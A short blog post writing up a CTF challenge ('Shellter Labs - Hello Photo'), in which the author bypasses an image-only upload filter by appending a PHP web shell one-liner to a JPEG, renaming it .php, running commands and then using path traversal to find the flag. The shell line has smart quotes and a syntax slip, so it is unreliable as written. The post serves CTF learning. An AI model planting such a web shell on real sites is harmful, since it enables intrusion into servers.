---
layout: default
title:  "Shellter Labs - Hello Photo"
date:   2019-05-29
categories: main
---

# Shellter Labs- Hello Photo
By just seeing the upload button i thought that is surely going to be an executing command using file upload challenge

![](https://paper-attachments.dropbox.com/s_14876C969013F8CA310BF79378B4A72484ECB88169401B4D5240D129E903BE7C_1559029410368_Screen+Shot+2019-05-28+at+1.12.15+PM.png)


Earlier i have performed command execution through an upload action in another CTF, but it was direct file upload without any restriction but here i have restriction that i only have to upload jpeg or gif

![](https://paper-attachments.dropbox.com/s_14876C969013F8CA310BF79378B4A72484ECB88169401B4D5240D129E903BE7C_1559029577670_Screen+Shot+2019-05-28+at+1.15.38+PM.png)


So i searched for reverse shell through images, then i came across a video which showed me how to add a php content to image and change it into php extension  


    echo ‘<?php if($_GET{system($_GET[“cmd”]);}?>’ >> uploadImage.jpg


    mv uploadImage.jpg uploadImage.php

A php file will b created,what we need to do is  just to upload the php file

![](https://paper-attachments.dropbox.com/s_14876C969013F8CA310BF79378B4A72484ECB88169401B4D5240D129E903BE7C_1559030280071_Screen+Shot+2019-05-28+at+1.27.46+PM.png)


It says that my file is uploaded successfully now what we can access the php file which is available in ‘uploads’ directory

![](https://paper-attachments.dropbox.com/s_14876C969013F8CA310BF79378B4A72484ECB88169401B4D5240D129E903BE7C_1559030384719_Screen+Shot+2019-05-28+at+1.29.31+PM.png)


So my command is working properly

Now we have to find the flag, as usual try path traversal

![](https://paper-attachments.dropbox.com/s_14876C969013F8CA310BF79378B4A72484ECB88169401B4D5240D129E903BE7C_1559030449651_Screen+Shot+2019-05-28+at+1.30.40+PM.png)


So here we go found the flag

![](https://paper-attachments.dropbox.com/s_14876C969013F8CA310BF79378B4A72484ECB88169401B4D5240D129E903BE7C_1559030512440_Screen+Shot+2019-05-28+at+1.31.20+PM.png)


**Takeaway:**

Command execution with file upload using image files.

<div id="hyvor-talk-view"></div>
<script type="text/javascript">
    var HYVOR_TALK_WEBSITE = 961; // DO NOT CHANGE THIS
    var HYVOR_TALK_CONFIG = {
        url: '{{ page.url | absolute_url }}',
        id: '{{page.id}}'
    };
</script>
<script async type="text/javascript" src="//talk.hyvor.com/web-api/embed"></script>
